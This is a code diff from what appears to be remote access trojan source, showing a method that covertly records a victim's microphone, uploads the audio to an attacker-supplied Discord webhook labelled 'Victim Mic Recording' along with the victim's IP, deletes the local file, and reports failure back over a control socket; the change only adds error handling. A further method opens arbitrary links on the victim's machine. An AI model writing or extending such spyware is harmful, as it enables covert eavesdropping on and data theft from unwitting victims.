@@ -80,20 +80,23 @@ class back:
                 pass
 
     def record_sound(self, time, channel, frequency, url):
-        webhook = DiscordWebhook(url=url)
-        freq = int(frequency)
-        duration = int(time)
-        main = freq * duration
-        recording = sd.rec(int(freq * duration), samplerate=freq, channels=int(channel))
+        try:
+            webhook = DiscordWebhook(url=url)
+            freq = int(frequency)
+            duration = int(time)
+            main = freq * duration
+            recording = sd.rec(int(freq * duration), samplerate=freq, channels=int(channel))
 
-        sd.wait()
-        wv.write("recording1.wav", recording, freq, sampwidth=2)
-        with open("recording1.wav", "rb") as f:
-            webhook.add_file(file=f.read(), filename='recording1.wav')
-        embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP of the victim: {ipadd}',color='1d0a26')
-        webhook.add_embed(embed)
-        response = webhook.execute()
-        os.remove("recording1.wav")
+            sd.wait()
+            wv.write("recording1.wav", recording, freq, sampwidth=2)
+            with open("recording1.wav", "rb") as f:
+                webhook.add_file(file=f.read(), filename='recording1.wav')
+            embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP of the victim: {ipadd}',color='1d0a26')
+            webhook.add_embed(embed)
+            response = webhook.execute()
+            os.remove("recording1.wav")
+        except:
+            s.send(b"[!] Can't record sound !!")
     
     def open_url(self, link):
         webbrowser.open_new(link)
